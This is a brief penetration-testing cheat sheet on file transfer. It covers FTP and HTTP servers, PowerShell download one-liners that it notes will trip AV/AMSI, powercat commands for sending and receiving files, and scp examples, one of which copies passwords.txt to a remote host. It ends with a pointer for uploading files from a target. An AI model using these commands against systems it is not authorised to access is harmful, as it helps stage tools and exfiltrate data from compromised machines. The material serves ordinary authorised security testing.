# Transferring Files

# Services to Host Files on your System:

General Options:

FTP:

Install pyftpdlib - pip3 install pyftpdlib

Pure-ftpd - sudo apt install pure-ftpd - service pure-ftpd start

Run (-w flag allows anonymous write access) - Python3 -m pyftpdlib -p 21 -w

Web:

- Python3 -m http.server 443
- service apache2 start

Powershell:

Raw (Will get flagged by AV/AMSI):

- powershell -c (New-Object Net.WebClient).DownloadFile(‘http://172.21.0.0:port/file’, ‘output-file’
- powershell -c Invoke-WebRequest -Uri “http://172.21.0.0” -OutFile “C:”

Use Powercat:

Send File: powercat -c 10.1.1.1 -p 443 -i C: Recieve File: powercat -l -p 8000 -of C:

Linux:

scp:

- scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2

scp through ssh:

- scp -P 2322 passwords.txt remote_username@172.21.0.2:/remote/directory

scp remote file to local system:

- scp remote_username@172.21.0.2:/remote/file.txt /local/directory

# Services to allow you to upload files to your system from the target:

- SimpleHTTPServer Upload: https://gist.github.com/touilleMan/eb02ea40b93e52604938